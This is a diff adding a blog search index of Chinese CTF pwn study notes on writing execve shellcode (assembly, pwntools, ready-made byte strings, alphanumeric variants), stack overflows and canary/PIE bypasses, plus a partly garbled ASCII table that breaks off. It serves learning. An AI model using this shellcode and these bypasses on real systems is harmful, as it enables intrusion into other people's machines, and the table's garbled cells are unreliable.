@@ -1,0 +1,10035 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>01 ShellCode</title>
+    <url>//docx/01%20ShellCode/</url>
+    <content><![CDATA[什么是shellcodeshellcode通常是软件漏洞利用过程中使用的一小段机器代码
+作用：
+1、启动shell进行交互
+2、打开服务器端口等待连接
+3、反向连接端口
+4、。。。。
+shellcode编写我们在linux系统写编写一个最简短的c语言程序：
+//gcc -m32 -o shell shell.c#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;void main()&#123;    system(&quot;/bin/sh&quot;);    exit(0);&#125;
+
+很显然，这样做出来的程序太大了，在题目中我们一般只能输入几十个字节，其次他直接使用了系统函数，但是我们都不知道系统函数是啥（被包装成sytem@plt了）：
+
+
+我们可以通过中断的方法进行系统调用。
+系统中断方法调用shellcode触发中断（int 0x80或者syscall），进行系统调用
+system(“&#x2F;bin&#x2F;sh”)底层调用的是execve(“&#x2F;bin&#x2F;sh”,0,0)
+我们可以看execve函数分别对应的调用：
+
+
+
+64位
+
+
+
+
+
+
+
+
+
+
+
+NR
+System call
+%rax
+%rdi（arg0）
+%rsi（arg1）
+%rdx（arg2）
+%r10（arg3）
+%r8（arg4）
+%r9（arg5）
+
+
+59
+sys_execve
+0x3b
+const char *filename
+const char *const argv[]
+const char* const envp[]
+
+
+
+
+
+32位
+
+
+
+
+
+
+
+
+
+
+NR
+System call
+%eax
+%ebx（arg0）
+%ecx（arg1）
+%edx（arg2）
+%esi（arg3）
+%edi（arg4）
+%ebp（arg5）
+
+
+11
+sys_execve
+0x0b
+const char *filename
+const char *const argv[]
+const char* const envp[]
+
+
+
+
+
+其中在syscall中，每一个寄存器都会有各自的参数作用，最后的int 0x80就是linux系统调用的中断，也就是使用这个终端，就会触发syscall（系统调用）
+32位shellcode因为execve(“&#x2F;bin&#x2F;sh”,0,0)如表格所示，所以我可以写一个不需要callsys也可以直接进入shell的shellcode，具体如下：
+;;nasm -f elf32 shellcode32.asm;;ld -m elf_i386 -o shellcode32 shellcode32.o;;objdump -d shellcode32global _start_start:    push &quot;/sh&quot;    push &quot;/bin&quot;    mov ebx, esp    xor ecx, ecx    xor edx, edx    mov eax, 0x0b    int 0x80
+
+现在，我们得到一个非常小的shellcode，并且也没有使用系统函数。
+
+因为是i386，也就是32位的程序，很显然我们可以看到这里对应32位的syscall各自的参数是如表格所示的。
+64位shellcode如此这般，我们可以构造一个64位的shellcode：
+;;nasm -f elf64 shellcode64.asm;;ld -m elf_x86_64 -o shellcode64 shellcode64.o;;objdump -d shellcode64global _start_start:    mov rbx, &#x27;/bin/sh&#x27;     ; 把字符串&quot;/bin/sh&quot;的地址放到rbx寄存器    push rbx               ; 将&quot;/bin/sh&quot;的地址压入栈    push rsp               ; 把当前栈顶指针（指向&quot;/bin/sh&quot;地址）压入栈    pop rdi                ; 从栈弹出数据到rdi，使rdi指向&quot;/bin/sh&quot;    xor rsi, rsi           ; 清空rsi（argv参数设为0）    xor rdx, rdx           ; 清空rdx（envp参数设为0）    push 0x3b              ; 把系统调用号0x3b压入栈    pop rax                ; 从栈弹出数据到rax，设置系统调用号    syscall                ; 执行系统调用
+
+在64位里面，相比于32位，首先是传参寄存器的名字有所更改，其中int 0x80变成了syscall。
+ 其中我们要记得一些常用的蠢货十六进制数，用于到时候用来查看或者学习：
+
+
+
+十六进制数
+含义
+用法
+
+
+
+0x68732f2f
+&#x2F;&#x2F;sh
+plain mov ebx, 0x68732f2f    ; 存储 &quot;//sh&quot;（双斜杠是为了对齐） push rbx               ; 压入 &quot;//sh&quot; 
+
+
+0x6e69622f
+&#x2F;bin
+plain mov ebx, 0x6e69622f    ; 存储 &quot;/bin&quot; push rbx               ; 压入 &quot;/bin&quot; 
+
+
+0x0068732f6e69622f
+&#x2F;bin&#x2F;sh
+
+
+
+这边是用于对齐1byte，也就是8位，所以四个字符四个字符的输入（一个字符一byte，一个byte两个十六进制数，四个byte8个十六进制数）
+如此这般，我的64位shellcode也可以写成：
+;;nasm -f elf64 shellcode64_nostr.asm;;ld -m elf_x86_64 -o shellcode64_nostr shellcode64_nostr.o;;objdump -d shellcode64_nostrglobal _start_start:    mov rbx, 0x0068732f6e69622f ;其中00是\0的意思    push rbx    push rsp    pop rdi    xor rsi, rsi    xor rdx, rdx    push 0x3b    pop rax    syscall
+
+很显然，我们现在倒是理解了这个最基础的内容，那么我们直接放到pwn里面岂不是还要当场构造汇编嘛？
+完全不用，我们只需要熟悉pwntools就可以快速生成对应架构的shellcode了。
+使用pwntool快速生成shellcode使用pwntools快速生成对应架构的shellcode，总共两步：
+1、设置架构目标 2、生成shellcode
+#32位from pwn import*context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)shellcode = asm(shellcraft.sh())
+
+其中他的shellcode如下：
+.section .shellcode,&quot;awx&quot;.global _start.global __start_start:__start:.intel_syntax noprefix.p2align 0    /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */    /* push b&#x27;/bin///sh\x00&#x27; */    push 0x68    push 0x732f2f2f    push 0x6e69622f    mov ebx, esp    /* push argument array [&#x27;sh\x00&#x27;] */    /* push &#x27;sh\x00\x00&#x27; */    push 0x1010101    xor dword ptr [esp], 0x1016972    xor ecx, ecx    push ecx /* null terminate */    push 4    pop ecx    add ecx, esp    push ecx /* &#x27;sh\x00&#x27; */    mov ecx, esp    xor edx, edx    /* call execve() */    push 11 /* 0xb */    pop eax    int 0x80
+
+#64位from pwn import*context(log_level = &#x27;debug&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)shellcode = asm(shellcraft.sh())
+
+其中它的shellcode如下：
+.section .shellcode,&quot;awx&quot;.global _start.global __start_start:__start:.intel_syntax noprefix.p2align 0    /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */    /* push b&#x27;/bin///sh\x00&#x27; */    push 0x68    mov rax, 0x732f2f2f6e69622f    push rax    mov rdi, rsp    /* push argument array [&#x27;sh\x00&#x27;] */    /* push b&#x27;sh\x00&#x27; */    push 0x1010101 ^ 0x6873    xor dword ptr [rsp], 0x1010101    xor esi, esi /* 0 */    push rsi /* null terminate */    push 8    pop rsi    add rsi, rsp    push rsi /* &#x27;sh\x00&#x27; */    mov rsi, rsp    xor edx, edx /* 0 */    /* call execve() */    push 59 /* 0x3b */    pop rax    syscall
+
+这些方法生成的shellcode非常有用，在与他把0x00（也就是\0)（或者64位补0）的情况给消灭了。不会出一些奇怪的bug。
+普通shellcode了解完上面的东西之后，我们可以学一下这道题目：
+64位经典shellcode：mrctf2020_shellcode
+这道题目就是一个典型的64位系统的shellcode，输入完shellcode之后就可以直接进入终端。然后这里还有一个32位的
+32位经典shellcode：ciscn_2019_s_9
+ORW有一种比较特殊的shellcode，就是这样的：shellcode1_dahuan02
+这道题目是ORW，所谓ORW就是Open、Read、Write。
+因为几乎所有的程序都需要打开文件，读取数据和输出。而有些题目会封锁systemcall里面的sys_execve。按照这个逻辑，我们可以通过ORW来读取所有我们需要的文件，如下：
+
+这是一个非常基本的64位流程图，因为这些题目都会有一个特性：执行用户输入进去的内容。
+然后在这里我们详细讲一下ORW的残割参数和里面是如何传递输出的。
+首先我们先要学习一下这三个函数：
+就拿32位的举例：
+
+
+
+Num
+syscall
+%eax
+arg0 (%ebx)
+arg1 (%ecx)
+arg2 (%edx)
+
+
+
+3
+read
+0x03
+unsigned int fd
+char *buf
+size_t count
+
+
+4
+write
+0x04
+unsigned int fd
+const char *buf
+size_t count
+
+
+5
+open
+0x05
+const char *filename
+int flags
+umode_t mode
+
+
+eax是调用这个syscall所需要的值，就像是sys_execve的里面的0x0b一样，是调用号。再然后，我们来讲这三个函数，先是open函数。
+open函数我们首先使用open函数打开文件，第一参数位文件名，第二参数为打开模式，第三参数为打开权限
+其中第一参数文件名就不多赘述了，打开模式必选第二参数，大概如下：
+O_RDONLY：只读模式（值为 0）。
+O_WRONLY：只写模式（值为 1）。
+O_RDWR：读写模式（值为 2）。
+// 只读打开，若文件不存在则报错open(&quot;file.txt&quot;, O_RDONLY);//read only的常数值为0// 读写打开，若文件不存在则创建，权限为 0644（需第三参数）open(&quot;file.txt&quot;, O_RDWR | O_CREAT, 777);//读写模式的常数值为2// 只写打开，若文件存在则清空，不存在则创建open(&quot;file.txt&quot;, O_WRONLY | O_CREAT | O_TRUNC, 777);// 追加模式打开，若文件不存在则创建open(&quot;log.txt&quot;, O_WRONLY | O_CREAT | O_APPEND, 777);
+
+第三参数为打开权限，一般不用填写。
+随后open会返回一个返回符号fd。
+read函数当我们使用完open之后，会得到一个返回值存储在eax里面，这个返回值一般被叫做_fd（文件调用符）_，fd的值会从0开始，作为一个等差数组一个一个往上加，例如0,1,2,3,4这样。
+其中，每个程序一开始会自我定义三个fd，分别如下：
+
+
+
+文件描述符
+名称
+含义
+通常关联的设备
+
+
+
+0
+STDIN_FILENO
+标准输入
+键盘
+
+
+1
+STDOUT_FILENO
+标准输出
+终端屏幕
+
+
+2
+STDERR_FILENO
+标准错误输出
+终端屏幕（错误信息）
+
+
+就像这样，所以一般我们用户开始使用程序的时候创建的fd都是从3开始的，不过最好就是调用完open函数后把eax或rax的值立刻放到read里面。而read的第一参数就是fd。fd里面有很多内容。
+read的第二参数是缓冲区地址，也就是我们要要把读取的数据存在哪里。是的，read其实是用来将读取的内容送到缓冲区的一个函数。一开始的时候，我们获得了fd，其代表哪一个文件被我们授权打开了，上面说到fd有很多的内容，在应用层面就是一个数字，但是这个数字可以指向一堆系统层面的东西，比如说这个fd指向的文件的信息，大小等等。所以我们获得fd的时候，也就获得了对这个文件的使用权限，read函数也就知道了读取什么了。
+然后我们把读取到的数据存到缓冲区地址。随后就是第三参数了：第三参数是读取的字节数量。也就是我要读取多少个数据。
+read的返回值是成功读取的参数数量，也就是字符长度。
+下面是Write函数：
+write函数他的三个参数和read函数差不多。
+不过这里我们要注意，第一参数这里不是返回值，而是1，也就是标准输出。我们要将数据write到标准输出（终端屏幕）上。然后第二参数标注读取哪里的缓冲区的数据，读取第三参数的数量
+shellcode变型这是最后一种类型的shellcode，和mrctf2020_shellcode类似（在上面栏目的普通shellcode里面），限度如shellcode，再call rax执行shellcode。
+他们的区别在，对输入的shellcode字符进行了过滤：只能输入特定的字符。
+这边的例题是：mrctf2020_shellcode_revenge
+然后偷了大欢老师那边的现成的shellcode：
+#不可见版本#32 位 短字节 shellcode -&gt; 21 字节b&quot;#\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&quot;#64 位 较短的 shellcode 23 字节b&quot;#\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;#可见版本#x64 下的：b&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;#x32 下的：b&quot;PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA&quot;
+
+也可以用工具生成：alpha3.py
+还有一些比较特殊的shellcode，需要用XOR异或加密方法来构造，可以看笔记[NewStarCTF 2023 公开赛道]shell code revenge，算是有点难度。
+总结
+对于长度和字符没有限制的 shellcode，可以使用 pwntools 来生成或者搜索现成的 shellcode
+长度有限制的 shellcode，可以对照系统调用表手写 shellcode
+字符集有限制的 shellcode，可以使用 ALPHA3、msf 等工具对 shellcode 进行编码。或者根据限制的字符先生成可用的汇编指令再进行指令等价替换。
+
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>PWN攻略-主线</tag>
+        <tag>shellcode</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>02 栈溢出介绍及初级栈溢出</title>
+    <url>//docx/02%20%E6%A0%88%E6%BA%A2%E5%87%BA%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%9D%E7%BA%A7%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
+    <content><![CDATA[栈溢出基础C语言函数调用栈函数调用栈函数调用栈是指程序运行时侯，内存的一段连续的区域。用来保护函数运行时候的状态信息（函数参数，局部变量等）。
+称之为“栈”的原因是因为发生函数调用时，调用函数_（caller）_的状态被保存在栈内，被调用函数（callee）的状态压入调用栈的栈顶。
+在函数调用结束的时候，栈顶的被调用函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态。
+调用函数栈在内存中从高地址向低地址生长，所以栈顶对应内存地址在压栈时变小，退栈时候变大。
+
+比如下面这个代码：
+#include&lt;stdio.h&gt;int main()&#123;    chat str[]=&quot;hello,world&quot;;    printf(&quot;%s&quot;,str);    return 0;&#125;
+
+其中，str被保存在main的函数栈区中，当我调用printf的时候，str便会放入到printf函数的栈区中。此时printf就是被调用函数callee，而caller就是调用函数main。
+栈帧结构就像我上面说的，每次使用某个函数的时候就会创造相对于的“调用函数的状态”或者“被调用函数的状态”。而这个栈的结构是怎么样的呢：
+
+简单介绍一下，这边我们的从_局部变量(Local variables)_到_栈帧指针(stack frame pointer)_的范围内都是我们的被调用寄存器，而返回地址上面（向高地址）的参数则是前一个函数的参数，在前面是上一个函数的栈帧指针。所以一般而言，我们只要看_局部变量(Local variables)_到_栈帧指针(stack frame pointer)_的范围就行了。
+然后这张图是完全按照高地址到低地址（上到下）来呈现的。
+函数状态寄存器要表示一个函数此时此刻栈帧中的状态，主要涉及到三个寄存器：esp，ebp和eip。（在64位架构下这些指针应该叫做rsp,rbp和rip)（下边大部分时候都拿32位的称呼去做操作演示）
+**EIP RIP：**全称叫做_指令指针（Instruction Pointer, IP）_，它用于存储吓一跳将被执行的指令在代码段中的偏移地址。CPU通过EIP寄存器来确定从内存中的哪一个位置来读取下一条指令。当我运行printf(“Helloworld”)的时候，eip会先指向指令mov rdi, [Helloworld字符串地址]，然后再指向call printf这个指令。这两条指令构成了在某一函数内输出Helloworld的方式。
+**ESP RSP：**全称叫做_栈指针（Extended Stack Pointer，SP，又叫做栈顶指针）_，栈遵循先进后出原则。ESP指针一般指向栈顶，当有值被压入栈的时候，栈顶指针就会根据被压入栈中参数的长短做偏移形成存有新值的ESP指针。简而言之，不管栈如何变化，ESP寄存器一般而言都会存有当前栈顶地址的状态。
+EBP RBP：全称叫做_基址指针（Base Pointer，BP，又叫做栈底指针），_当栈被创建的时候，EBP就指向栈的最低端，此时EBP==ESP，随后当栈发生变化（有数据压入或者弹出），ESP在变化的时候，EBP还是存有栈底的地址，不会变化。简而言之，不管栈如何变化，EBP寄存器一般而言都会存有当前函数栈底地址的状态。
+函数栈形成与状态首先将被调用函数callee的参数按照逆序依次压入栈内。如果callee不需要参数，则没有这一步骤。这些参数仍会保存在caller的函数状态内。之后压入栈内的数据就会作为callee的函数状态保存，如下图所示：
+
+将被调用函数(Callee)的参数压入栈中1
+然后将调用函数（caller）进行调用之后的下一条指令地址作为返回地址压入返回地址压入栈内。这样caller的eip信息就得以保存了，如下图所示：
+
+将被调用函数(Callee)的参数压入栈中2
+再将当前的ebp寄存器的值（也就是caller的基地址）压入栈内，并将ebp寄存器的值更新位当前栈顶的地址。这样调用函数caller的ebp信息得以保存，同时，ebp被更新为callee的基地址，如下图所示：
+
+将caller的ebp压入栈内，并将当前栈顶地址传入ebp中
+在压栈的过程中，esp的寄存器的值不断变小（对应栈从内存高地址向低地址生长）。压入栈内的数据包括调用参数、返回地址、调用函数的及地址、局部变量这些参数的状态。其中调用参数以外的数据共同构成了被调用函数callee的状态。
+在发生调用时候，程序还会将callee的指令地址存到eip寄存器内，这样程序就可以依次执行callee的指令了。
+最后将被调用函数(callee)的局部变量压入栈内，如下图所示：
+
+将caller的ebp压入栈内，并将当前栈顶地址传入ebp中
+看过了函数调用发生时的情况，就不难理解函数调用结束时候的变化。变化的和性就是丢弃callee的状态，将栈顶恢复成caller的状态。首先callee的局部变量会先从栈内直接弹出，栈顶会指向callee的基地址。
+然后将基地址的内储存调用函数caller的基地址从栈内弹出，并且存到ebp寄存器中，这样caller的ebp信息得以恢复。此时栈顶会指向返回地址。
+最后将返回地址pop到eip中，随后esp再向上一格，回到caller的栈顶位置，ebp保持不变。如下图所示：
+
+栈溢出（stack overflow）栈溢出原理讲完上面的基础知识，我们可以理解：当函数正在执行内部指令的过程中，我们无法拿到程序的控制权，只有在发生函数调用或者结束函数调用的时候，程序的控制权会在函数状态之间发生跳转，这时我们可以通过修改函数状态（修改返回地址）来实现攻击。而控制程序执行指令最关键的寄存器就是eip，所以我们的目标就是让rip载入攻击指令的地址。 
+:::info缓冲区溢出（Buffer overflow）
+编写程序的时候没有考虑到或者错误的控制用户输入的长度，本质就是向定长的缓冲区中写入了超长的数据，造成超出的数据覆写了合法内存区域。
+栈溢出（Stack overflow）：最常见、漏洞比例最高、危害最大的二进制漏洞。在CTF PWN中往往是漏洞利用的基础。
+堆溢出（Heap overflow）：关系到堆管理器系统，比较复杂，利用花样多。CTF PWN中的常见题型
+Data段溢出：比如.bss段，修改关键变量，比较少见。攻击效果依赖于Data段上存放了何种控制数据。
+:::
+栈溢出的基本利用如果说有这么一个函数（32位）：
+int overflow()&#123;    char buf[8];    read(0, buf, 16);    return 0;&#125;
+
+当我调用这个函数的时候，函数将初始化esp和ebp寄存器，且将eip指针指向这个代码中。而下面这张图的左边就是overflow的栈帧视图，右边则为我输入AAAABBBBCCCCDDDD之后栈帧中实际的值存储情况。
+
+我们会发现当我们输入这么多东西之后，return address就被篡改成了’DDDD’所表示的地址，也就是0x44444444。而此时此刻也会出现一个问题：那就程序中没有0x44444444这个地址。
+所以如果我们一旦把DDDD这一块的内容改成某个具体的地址化，实际上就会跳转到这个地址，并且运行这个地址里面的内容了。也就是——篡改栈帧上的返回地址，为程序中已有的函数。
+学完上面的内容，我们可以配合一套例题来食用：overflow_ez_32
+Canary_pie绕过canary机制canary原理canary是一个用来防护栈溢出的保护机制。其原理是在一个函数的入口处，先从fs&#x2F;gs寄存器中取出一个四字节或者八字节（取决于系统架构是32还是64）的值存到栈上去。当函数结束时会检查这个栈上的值是否和一开始存进去的值一样。程序每次运行的时候，canary的值都会不一样。对于我们而言，canary的值几乎是一个随机值。我们无法知道值是多少。
+像我们上面举例的例子，再有canary的情况下就会变成这样：
+
+如果像这样，我们将Canary篡改之后，就会触发`__Stack_chk_fail`这个函数，并且会报错。
+
+不过就像上面所说，如果我们知道canary的值是多少，那么我们便可以在栈溢出的时候保留canary的值，且就可以成功溢出了。
+:::info说起来我也是无聊，当时学canary的时候，很好奇这个翻译过来叫做“金丝雀”的东西为什么会是一种保护机制。
+这个名字非常有趣，他和我们的近代工业史有关——19世纪时候的煤矿工人下井挖矿的时候，会带着一只金丝雀。矿井里面会有一些无色无味的有毒气体，像是一氧化碳，人类要吸入一定剂量才会出现问题，而且那个时候已经逃不掉了。不过金丝雀这种小动物容易出现明显反应。矿工们通过观察金丝雀的状态，就能提前察觉危险，及时撤离。
+还有一种说法是（我觉得两种都有），矿工下矿前会把金丝雀先拿绳子下放到矿井中，过一会儿再拿上来查看反应。这个就很像栈溢出的时候canary先放入栈中试探，等到函数运行结束的时候再拿上来对比值一样了。
+canary保护顾名思义，和金丝雀一样脆弱。每当一次canary绕过失败的时候，你可以理解为计算机里面死了一只电子金丝雀（难崩）。
+:::
+canary绕过方法如此，其实绕过canary的最重要的一步就是如何获取canary的值，canary绕过大概有以下几种绕过方式：
+**1、格式化字符串绕过canary：**通过格式化字符串读取canary的值
+**2、canary爆破（针对有fork的程序）：**我在pwn及计算机原理基础知识这里说明了fork函数的具体作用。fork函数相当于自我复制，每一次复制出来的程序，内存布局都是一样的，当然canary的值也是一样的。所以可以通过这个机制堆canary逐位爆破，如果程序崩溃了就说明这一位不对。如果程序可以正常那就接着跑下一位，直到跑出正确的canary。
+3、Stack samashing（故意触发**canary_spp leak**）
+**4、劫持__stack_chk_fail：**修改got表中__stack_chk_fail函数的地址，在栈溢出后执行该函数，不过因为我们修改了__stack_chk_fail函数所指向的地址，程序运行__stack_chk_fail的时候就会跳转到我们当时修改的地址。
+格式化字符串绕过canary（我懒得画图了，这一块我就用Excel来画图演示，会比较方便）
+有关格式化字符串的介绍可以去看暗线中的：01 格式化字符串，稍微学一点即可，现在全学完学不明白。
+假设有一个%s这样的格式化字符串，如果我们把输入的内容和canary连在一起，那么在用%s这种格式化字符串输出的时候就会将canary一起打印出来。
+需要注意的是，canary的最后一位一定是’\0’，用于放置连带输出，所以我们改的时候，要把canary的最后一位也改了（其实理解成“最前面一位是’\0’”会比较合适，因为这里的，所谓“最后一位”实际上是小端序）。
+
+例题：
+PIE机制原理PIE技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护，那么在每次加载程序时都会变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题。
+在一个开启PIE保护的程序中，所有代码段的地址都只有最后三个数字是已知的：
+
+这些数字分别是这一行数据相对于基地址的偏移量。
+还有一点需要强调的是，程序的加载地址一般都是以内存页为单位的，所以程序的基地址的最后三个数字一定是0，也就是说我们看到的这些所谓的**“偏移量”就是内存中实际地址的最后三位数**。
+所以，虽然我不知道完整的地址，但我知道最后的三个数，那么我就可以利用栈上已有的地址，只修改他们的最后两个字节（最后四位数）即可。
+所以对于绕过PIE保护的核心思想就是**partial writing（部分地址改写）**
+例题：
+所以这种方法，从某种意义上按照道理每次爆破都只有1&#x2F;16的概率能进。
+还有泄露基地址。
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>PWN攻略-主线</tag>
+        <tag>shellcode</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ASCII码</title>
+    <url>//docx/ASCII%E7%A0%81/</url>
+    <content><![CDATA[
+
+
+二进制
+八进制
+十进制
+十六进制
+字符&#x2F;缩写
+解释
+
+
+
+0.
+0.
+0.
+0.
+NUL (NULL)
+空字符
+
+
+1.
+1.
+1.
+1.
+SOH (Start Of Headling)
+标题开始
+
+
+10.
+2.
+2.
+2.
+STX (Start Of Text)
+正文开始
+
+
+11.
+3.
+3.
+3.
+ETX (End Of Text)
+正文结束
+
+
+100.
+4.
+4.
+4.
+EOT (End Of Transmission)
+传输结束
+
+
+101.
+5.
+5.
+5.
+ENQ (Enquiry)
+请求
+
+
+110.
+6.
+6.
+6.
+ACK (Acknowledge)
+回应&#x2F;响应&#x2F;收到通知
+
+
+111.
+7.
+7.
+7.
+BEL (Bell)
+响铃
+
+
+1000.
+10.
+8.
+8.
+BS (Backspace)
+退格
+
+
+1001.
+11.
+9.
+9.
+HT (Horizontal Tab)
+水平制表符
+
+
+1010.
+12.
+10.
+0A
+LF&#x2F;NL(Line Feed&#x2F;New Line)
+换行键
+
+
+1011.
+13.
+11.
+0B
+VT (Vertical Tab)
+垂直制表符
+
+
+1100.
+14.
+12.
+0C
+FF&#x2F;NP (Form Feed&#x2F;New Page)
+换页键
+
+
+1101.
+15.
+13.
+0D
+CR (Carriage Return)
+回车键
+
+
+1110.
+16.
+14.
+0E
+SO (Shift Out)
+不用切换
+
+
+1111.
+17.
+15.
+0F
+SI (Shift In)
+启用切换
+
+
+10000.
+20.
+16.
+10.
+DLE (Data Link Escape)
+数据链路转义
+
+
+10001.
+21.
+17.
+11.
+DC1&#x2F;XON   (Device Control 1&#x2F;Transmission On)
+设备控制1&#x2F;传输开始
+
+
+10010.
+22.
+18.
+12.
+DC2 (Device Control 2)
+设备控制2
+
+
+10011.
+23.
+19.
+13.
+DC3&#x2F;XOFF   (Device Control 3&#x2F;Transmission Off)
+设备控制3&#x2F;传输中断
+
+
+10100.
+24.
+20.
+14.
+DC4 (Device Control 4)
+设备控制4
+
+
+10101.
+25.
+21.
+15.
+NAK (Negative Acknowledge)
+无响应&#x2F;非正常响应&#x2F;拒绝接收
+
+
+10110.
+26.
+22.
+16.
+SYN (Synchronous Idle)
+同步空闲
+
+
+10111.
+27.
+23.
+17.
+ETB (End of Transmission Block)
+传输块结束&#x2F;块传输终止
+
+
+11000.
+30.
+24.
+18.
+CAN (Cancel)
+取消
+
+
+11001.
+31.
+25.
+19.
+EM (End of Medium)
+已到介质末端&#x2F;介质存储已满&#x2F;介质中断
+
+
+11010.
+32.
+26.
+1A
+SUB (Substitute)
+替补&#x2F;替换
+
+
+11011.
+33.
+27.
+1B
+ESC (Escape)
+逃离&#x2F;取消
+
+
+11100.
+34.
+28.
+1C
+FS (File Separator)
+文件分割符
+
+
+11101.
+35.
+29.
+1D
+GS (Group Separator)
+组分隔符&#x2F;分组符
+
+
+11110.
+36.
+30.
+1E
+RS (Record Separator)
+记录分离符
+
+
+11111.
+37.
+31.
+1F
+US (Unit Separator)
+单元分隔符
+
+
+100000.
+40.
+32.
+20.
+(Space)
+空格
+
+
+100001.
+41.
+33.
+21.
+!
+0.
+
+
+100010.
+42.
+34.
+22.
+“
+0.
+
+
+100011.
+43.
+35.
+23.
+#
+0.
+
+
+100100.
+44.
+36.
+24.
+$00
+0.
+
+
+100101.
+45.
+37.
+25.
+0%
+0.
+
+
+100110.
+46.
+38.
+26.
+&amp;
+0.
+
+
+100111.
+47.
+39.
+27.
+‘
+0.
+
+
+101000.
+50.
+40.
+28.
+(
+0.
+
+
+101001.
+51.
+41.
+29.
+)
+0.
+
+
+101010.
+52.
+42.
+2A
+*
+0.
+
+
+101011.
+53.
+43.
+2B
++
+0.
+
+
+101100.
+54.
+44.
+2C
+,
+0.
+
+
+101101.
+55.
+45.
+2D
+-
+0.
+
+
+101110.
+56.
+46.
+2E
+.
+0.
+
+
+101111.
+57.
+47.
+2F
+&#x2F;
+0.
+
+
+110000.
+60.
+48.
+30.
+0.
+0.
+
+
+110001.
+61.
+49.
+31.
+1.
+0.
+
+
+110010.
+62.
+50.
+32.
+2.
+0.
+
+
+110011.
+63.
+51.
+33.
+3.
+0.
+
+
+110100.
+64.
+52.
+34.
+4.
+0.
+
+
+110101.
+65.
+53.
+35.
+5.
+0.
+
+
+110110.
+66.
+54.
+36.
+6.
+0.
+
+
+110111.
+67.
+55.
+37.
+7.
+0.
+
+
+111000.
+70.
+56.
+38.
+8.
+0.
+
+
+111001.
+71.
+57.
+39.
+9.
+0.
+
+
+111010.
+72.
+58.
+3A
+:
+0.
+
+
+111011.
+73.
+59.
+3B
+;
+0.
+
+
+111100.
+74.
+60.
+3C
+&lt;
+0.
+
+
+111101.
+75.
+61.
+3D
+&#x3D;
+0.
+
+
+111110.
+76.
+62.
+3E
+&gt;
+0.
+
+
+111111.
+77.
+63.
+3F
+?
+0.
+
+
+1000000.
+100.
+64.
+40.
+@
+0.
+
+
+1000001.
+101.
+65.
+41.
+A
+0.
+
+
+1000010.
+102.
+66.
+42.
+B
+0.
+
+
+1000011.
+103.
+67.
+43.
+C
+0.
+
+
+1000100.
+104.
+68.
+44.
+D
+0.
+
+
+1000101.
+105.
+69.
+45.
+E
+0.
+
+
+1000110.
+106.
+70.
+46.
+F
+0.
+
+
+1000111.
+107.
+71.
+47.
+G
+0.
+
+
+1001000.
+110.
+72.
+48.
+H
+0.
+
+
+1001001.
+111.
+73.
+49.
+I
+0.
+
+
+1001010.
+112.
+74.
+4A
+J
+0.
+
+
+1001011.
+113.
+75.
+4B
+K
+0.
+
+
+1001100.
+114.
+76.
+4C
+L
+0.
+
+
+1001101.
+115.
+77.
+4D
+M
+0.
+
+
+1001110.
+116.
+78.
+4E
+N
+0.
+
+
+1001111.
+117.
+79.
+4F
+O
+0.
+
+
+1010000.
+120.
+80.
+50.
+P
+0.
+
+
+1010001.
+121.
+81.
+51.
+Q
+0.
+
+
+1010010.
+122.
+82.
+52.
+R
+0.
+
+
+1010011.
+123.
+83.
+53.
+S
+0.
+
+
+1010100.
+124.
+84.
+54.
+T
+0.
+
+
+1010101.
+125.
+85.
+55.
+U
+0.
+
+
+1010110.
+126.
+86.
+56.
+V
+0.
+
+
+1010111.
+127.
+87.
+57.
+W
+0.
+
+
+1011000.
+130.
+88.
+58.
+X
+0.
+
+
+1011001.
+131.
+89.
+59.
+Y
+0.
+
+
+1011010.
+132.
+90.
+5A
+Z
+0.
+
+
+1011011.
+133.
+91.
+5B
+[
+0.
+
+
+1011100.
+134.
+92.
+5C
+&lt;&#x2F;font&gt;
+0.
+
+
+1011101.
+135.
+93.
+5D
+]
+0.
+
+
+1011110.
+136.
+94.
+5E
+^
+0.
+
+
+1011111.
+137.
+95.
+5F
+_
+0.
+
+
+1100000.
+140.
+96.
+60.
+&#96;
+0.
+
+
+1100001.
+141.
+97.
+61.
+a
+0.
+
+
+1100010.
+142.
+98.
+62.
+b
+0.
+
+
+1100011.
+143.
+99.
+63.
+c
+0.
+
+
+1100100.
+144.
+100.
+64.
+d
+0.
+
+
+1100101.
+145.
+101.
+65.
+e
+0.
+
+
+1100110.
+146.
+102.
+66.
+f
+0.
+
+
+1100111.
+147.
+103.
+67.
+g
+0.
+
+
+1101000.
+150.
+104.
+68.
+h
+0.
+
+
+1101001.
+151.
+105.
+69.
+i
+0.
+
+
+1101010.
+152.
+106.
+6A
+j
+0.
+
+
+1101011.
+153.
+107.
+6B
+k
+0.
+
+
+1101100.
+154.
+108.
+6C
+l
+0.
+
+
+1101101.
+155.
+109.
+6D
+m
+0.
+
+
+1101110.
+156.
+110.
+6E
+n
